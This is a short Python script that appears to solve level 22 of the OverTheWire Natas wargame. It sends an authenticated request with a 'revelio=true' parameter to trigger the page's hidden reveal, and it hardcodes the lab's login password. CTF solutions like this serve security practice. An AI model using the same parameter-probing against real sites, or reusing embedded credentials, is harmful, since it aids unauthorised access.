import requests
from requests.auth import HTTPBasicAuth

url = "http://natas22.natas.labs.overthewire.org/"
username = "natas22"
password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"

payload = "index.php?revelio=true"

url += payload

sess = requests.Session()
req= sess.get("http://natas22.natas.labs.overthewire.org/index.php?revelio=true", auth = HTTPBasicAuth(username, password))

print(req.text)